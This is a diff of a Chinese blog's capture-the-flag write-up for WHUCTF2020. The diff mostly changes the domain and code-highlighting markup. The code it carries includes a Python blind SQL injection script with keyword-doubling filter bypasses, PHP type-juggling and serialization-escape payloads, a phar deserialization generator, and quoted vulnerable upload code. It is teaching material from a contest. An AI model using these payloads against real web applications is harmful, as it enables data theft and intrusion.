@@ -8,17 +8,17 @@
         <title>WHUCTF2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="WHUCTF2020 Writeup" />
 <meta property="og:description" content="WHUCTF2020做题笔记" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/whuctf2020-writeup/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/whuctf2020-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-05-27T14:10:31+08:00" />
 <meta property="article:modified_time" content="2020-05-27T14:10:31+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="WHUCTF2020 Writeup"/>
 <meta name="twitter:description" content="WHUCTF2020做题笔记"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/whuctf2020-writeup/" /><link rel="prev" href="https://clq0.top/minilctf2020-writeup/" /><link rel="next" href="https://clq0.top/php-create_function/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/whuctf2020-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/minilctf2020-writeup/" /><link rel="next" href="https://blog.h4ck.fun/php-create_function/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -26,11 +26,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/whuctf2020-writeup\/"
-        },"genre": "posts","keywords": "Phar, SQL注入, LFI","wordcount":  3579 ,
-        "url": "https:\/\/clq0.top\/whuctf2020-writeup\/","datePublished": "2020-05-27T14:10:31+08:00","dateModified": "2020-05-27T14:10:31+08:00","publisher": {
+            "@id": "https:\/\/blog.h4ck.fun\/whuctf2020-writeup\/"
+        },"genre": "posts","keywords": "Phar, SQL注入, LFI","wordcount":  3566 ,
+        "url": "https:\/\/blog.h4ck.fun\/whuctf2020-writeup\/","datePublished": "2020-05-27T14:10:31+08:00","dateModified": "2020-05-27T14:10:31+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -104,7 +104,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">WHUCTF2020 Writeup</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-27">2020-05-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3579 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-27">2020-05-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3566 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;<span id="/whuctf2020-writeup/" class="leancloud_visitors" data-flag-title="WHUCTF2020 Writeup">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
@@ -128,7 +128,7 @@
 <p>exp：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -171,7 +171,7 @@
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">_username</span><span class="p">,</span><span class="n">_password</span><span class="p">):</span>
     <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://218.197.154.9:10011/login.php&#34;</span>
     <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
@@ -189,26 +189,26 @@
     <span class="p">}</span>
     <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
     <span class="n">content</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span>
-    <span class="c1">#print content</span>
+    <span class="c1">#print content</span>
     
     <span class="k">if</span> <span class="s2">&#34;Login success!&#34;</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
-        <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">return</span> <span class="kc">True</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">return</span> <span class="kc">False</span>
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
     <span class="n">find_name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
-    <span class="c1"># i 表示了所要查找的名字的最大长度</span>
+    <span class="c1"># i 表示了所要查找的名字的最大长度</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x50</span><span class="p">):</span>
-        <span class="c1"># 0x80=128 , 0x20=32,  32-128为可显示的字符的区间</span>
+        <span class="c1"># 0x80=128 , 0x20=32,  32-128为可显示的字符的区间</span>
         <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span> <span class="p">,</span> <span class="mh">0x20</span> <span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
             
             <span class="n">_username</span> <span class="o">=</span> <span class="s2">&#34;1&#39; oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">#&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
             <span class="n">_password</span><span class="o">=</span><span class="s2">&#34;1&#34;</span>
-            <span class="c1">#print _username</span>
+            <span class="c1">#print _username</span>
             <span class="k">if</span> <span class="n">login</span><span class="p">(</span><span class="n">_username</span><span class="p">,</span><span class="n">_password</span><span class="p">):</span>
                 <span class="n">find_name</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-                <span class="k">print</span> <span class="n">find_name</span>
+                <span class="nb">print</span> <span class="n">find_name</span>
                 <span class="k">break</span>
 
 <span class="n">main</span><span class="p">()</span>
@@ -226,7 +226,7 @@
 <p>源码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -280,7 +280,7 @@
 </span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__file__</span><span class="p">);</span>
 <span class="nv">$string_1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;str1&#39;</span><span class="p">];</span>
@@ -347,12 +347,12 @@
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">http://218.197.154.9:10015/?num=23333%0A&amp;str1=240610708&amp;str2=11230178
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">http://218.197.154.9:10015/?num=23333%0A&amp;str1=240610708&amp;str2=11230178
 POST：
 username=xxxxxxxxxxxxxxxxxxxx&#34;;i:1;s:6:&#34;123456&#34;;}
 </code></pre></td></tr></table>
@@ -360,7 +360,7 @@ username=xxxxxxxxxxxxxxxxxxxx&#34;;i:1;s:6:&#34;123456&#34;;}
 </div><p>poc：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -380,7 +380,7 @@ username=xxxxxxxxxxxxxxxxxxxx&#34;;i:1;s:6:&#34;123456&#34;;}
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>
     <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/x/&#39;</span><span class="p">,</span> <span class="s1">&#39;yy&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
 <span class="p">}</span>
@@ -397,8 +397,8 @@ username=xxxxxxxxxxxxxxxxxxxx&#34;;i:1;s:6:&#34;123456&#34;;}
 <span class="k">if</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$r</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;123456&#34;</span><span class="p">){</span>
     <span class="k">echo</span> <span class="s2">&#34;good!&#34;</span><span class="p">;</span>
 <span class="p">}</span> 
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -428,7 +428,7 @@ username=xxxxxxxxxxxxxxxxxxxx&#34;;i:1;s:6:&#34;123456&#34;;}
 简单来说<code>phar</code>就是<code>php</code>压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file://</code> <code>php://</code>等类似，也是一种流包装器。
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -436,7 +436,7 @@ username=xxxxxxxxxxxxxxxxxxxx&#34;;i:1;s:6:&#34;123456&#34;;}
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">//phar结构由 4 部分组成:
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">//phar结构由 4 部分组成:
 
 stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；
 manifest 压缩文件的属性等信息，以序列化存储；
@@ -456,7 +456,7 @@ signature 签名，放在文件末尾；
 <p>我们知道php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -473,7 +473,7 @@ signature 签名，放在文件末尾；
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
     <span class="c1">//根据具体代码修改可利用的类
 </span><span class="c1"></span>    <span class="k">class</span> <span class="nc">TestObject</span> <span class="p">{</span>
     <span class="p">}</span>
@@ -487,8 +487,8 @@ signature 签名，放在文件末尾；
 </span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件
 </span><span class="c1"></span>    <span class="c1">//签名自动计算
 </span><span class="c1"></span>    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>接下来我们看看WHUCTF这道题，</p>
 <p>在index.php访问其他页面抓包可以看到有<code>?acti0n=xxx</code></p>
@@ -496,7 +496,7 @@ signature 签名，放在文件末尾；
 <p>伪协议过滤了base64关键字，大小写即可绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -577,59 +577,59 @@ signature 签名，放在文件末尾；
 </span><span class="lnt">79
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
 
-<span class="p">&lt;</span><span class="nt">link</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;text/css&#34;</span> <span class="na">rel </span><span class="o">=</span> <span class="s">&#34;stylesheet&#34;</span> <span class="na">href </span><span class="o">=</span> <span class="s">&#34;css/style.css&#34;</span><span class="p">&gt;</span>
+<span class="o">&lt;</span><span class="nx">link</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&#34;text/css&#34;</span> <span class="nx">rel</span> <span class="o">=</span> <span class="s2">&#34;stylesheet&#34;</span> <span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;css/style.css&#34;</span><span class="o">&gt;</span>
 
-<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang </span><span class="o">=</span> <span class="s">&#34;zh&#34;</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span> <span class="p">/&gt;</span>
-  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>上传图片<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;text/javascript&#34;</span> <span class="na">color </span><span class="o">=</span> <span class="s">&#34;0,0,255&#34;</span> <span class="na">opacity </span><span class="o">=</span> <span class="s">&#39;0.7&#39;</span> <span class="na">zIndex </span><span class="o">=</span> <span class="s">&#34;-2&#34;</span> <span class="na">count </span><span class="o">=</span> <span class="s">&#34;99&#34;</span> <span class="na">src </span><span class="o">=</span> <span class="s">&#39;js/canvas-nest.min.js&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> <span class="c">&lt;!-- 动态背景 --&gt;</span>
-  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>上传你手里最好的图片!<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">id </span><span class="o">=</span> <span class="s">&#34;comment&#34;</span><span class="p">&gt;</span>If it is excellent enough, you will get the flag!<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class </span><span class="o">=</span> <span class="s">&#34;form1&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action </span><span class="o">=</span> <span class="s">&#34;upload.php&#34;</span> <span class="na">method </span><span class="o">=</span> <span class="s">&#34;post&#34;</span> <span class="na">accept-charset </span><span class="o">=</span> <span class="s">&#34;utf-8&#34;</span> <span class="na">enctype </span><span class="o">=</span> <span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">label</span> <span class="na">name </span><span class="o">=</span> <span class="s">&#34;title&#34;</span> <span class="na">for </span><span class="o">=</span> <span class="s">&#34;file&#34;</span><span class="p">&gt;</span>图片:   <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;file&#34;</span> <span class="na">name </span><span class="o">=</span> <span class="s">&#34;file&#34;</span> <span class="na">id </span><span class="o">=</span> <span class="s">&#34;file&#34;</span><span class="p">&gt;</span>
-      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;submit&#34;</span> <span class="na">class </span><span class="o">=</span> <span class="s">&#34;button&#34;</span> <span class="na">name </span><span class="o">=</span> <span class="s">&#34;submit&#34;</span> <span class="na">value </span><span class="o">=</span> <span class="s">&#34;上传&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-
-<span class="cp">&lt;?php</span> 
-  <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-  <span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
-  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
-    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">))</span> <span class="p">{</span>
-      <span class="k">echo</span> <span class="nx">error_get_last</span><span class="p">()[</span><span class="s1">&#39;message&#39;</span><span class="p">];</span>
-      <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Failed to make the directory&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-  <span class="nx">chdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
-  <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
-    <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
-    <span class="nv">$ans</span> <span class="o">=</span> <span class="nx">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">204800</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">die</span><span class="p">(</span><span class="s1">&#39;filesize too big.&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">die</span><span class="p">(</span><span class="s1">&#39;filename can not be empty!&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(htaccess)|(user)|(\.\.)|(%)|(#)/i&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-      <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Hacker!&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">((</span><span class="nv">$ans</span> <span class="o">!=</span> <span class="nx">IMAGETYPE_GIF</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$ans</span> <span class="o">!=</span> <span class="nx">IMAGETYPE_JPEG</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$ans</span> <span class="o">!=</span> <span class="nx">IMAGETYPE_PNG</span><span class="p">))</span> <span class="p">{</span>
-      <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
-      <span class="k">if</span><span class="p">(</span><span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;image/gif&#39;</span> <span class="k">or</span> <span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;image/jpg&#39;</span> <span class="k">or</span> <span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;image/png&#39;</span> <span class="k">or</span> <span class="nv">$type</span> <span class="o">==</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;p align=</span><span class="se">\&#34;</span><span class="s2">center</span><span class="se">\&#34;</span><span class="s2">&gt;Don&#39;t cheat me with Content-Type!&lt;/p&gt;&#34;</span><span class="p">;</span>
+<span class="o">&lt;</span><span class="nx">html</span> <span class="nx">lang</span> <span class="o">=</span> <span class="s2">&#34;zh&#34;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span> <span class="o">/&gt;</span>
+  <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">上传图片</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&#34;text/javascript&#34;</span> <span class="nx">color</span> <span class="o">=</span> <span class="s2">&#34;0,0,255&#34;</span> <span class="nx">opacity</span> <span class="o">=</span> <span class="s1">&#39;0.7&#39;</span> <span class="nx">zIndex</span> <span class="o">=</span> <span class="s2">&#34;-2&#34;</span> <span class="nx">count</span> <span class="o">=</span> <span class="s2">&#34;99&#34;</span> <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;js/canvas-nest.min.js&#39;</span><span class="o">&gt;&lt;/</span><span class="nx">script</span><span class="o">&gt;</span> <span class="o">&lt;!--</span> <span class="nx">动态背景</span> <span class="o">--&gt;</span>
+  <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">上传你手里最好的图片</span><span class="o">!&lt;/</span><span class="nx">h2</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span> <span class="o">=</span> <span class="s2">&#34;comment&#34;</span><span class="o">&gt;</span><span class="k">If</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">excellent</span> <span class="nx">enough</span><span class="p">,</span> <span class="nx">you</span> <span class="nx">will</span> <span class="nx">get</span> <span class="nx">the</span> <span class="nx">flag</span><span class="o">!&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">div</span> <span class="k">class</span> <span class="err">= &#34;</span><span class="nc">form1</span><span class="s2">&#34;&gt;
+</span><span class="s2">    &lt;form action = &#34;</span><span class="nx">upload</span><span class="o">.</span><span class="nx">php</span><span class="s2">&#34; method = &#34;</span><span class="nx">post</span><span class="s2">&#34; accept-charset = &#34;</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span><span class="s2">&#34; enctype = &#34;</span><span class="nx">multipart</span><span class="o">/</span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="s2">&#34;&gt;
+</span><span class="s2">      &lt;label name = &#34;</span><span class="nx">title</span><span class="s2">&#34; for = &#34;</span><span class="nx">file</span><span class="s2">&#34;&gt;图片:   &lt;/label&gt;
+</span><span class="s2">      &lt;input type = &#34;</span><span class="nx">file</span><span class="s2">&#34; name = &#34;</span><span class="nx">file</span><span class="s2">&#34; id = &#34;</span><span class="nx">file</span><span class="s2">&#34;&gt;
+</span><span class="s2">      &lt;input type = &#34;</span><span class="nx">submit</span><span class="s2">&#34; class = &#34;</span><span class="nx">button</span><span class="s2">&#34; name = &#34;</span><span class="nx">submit</span><span class="s2">&#34; value = &#34;</span><span class="nx">上传</span><span class="s2">&#34;&gt;
+</span><span class="s2">    &lt;/form&gt;
+</span><span class="s2">  &lt;/div&gt;
+</span><span class="s2">
+</span><span class="s2">&lt;/body&gt;
+</span><span class="s2">&lt;/html&gt;
+</span><span class="s2">
+</span><span class="s2">&lt;?php 
+</span><span class="s2">  error_reporting(0);
+</span><span class="s2">  </span><span class="si">$dir</span><span class="s2"> = &#39;upload/&#39;.md5(</span><span class="si">$_SERVER[&#39;REMOTE_ADDR&#39;]</span><span class="s2">).&#39;/&#39;;
